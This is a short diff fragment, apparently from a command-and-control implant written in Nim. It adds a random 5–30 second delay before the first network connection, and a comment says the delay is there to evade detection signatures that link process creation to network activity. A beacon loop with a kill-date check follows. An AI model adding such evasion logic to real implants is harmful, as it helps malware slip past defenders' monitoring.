+  # Initial connection jitter (5-30 seconds) to avoid process-creation to network-connect correlation signatures
+  let initialJitterMs = rand(25000) + 5000
+  await sleepAsync(initialJitterMs)
 
   while true:
     if meta.killDate > 0 and getTime().toUnix >= meta.killDate:
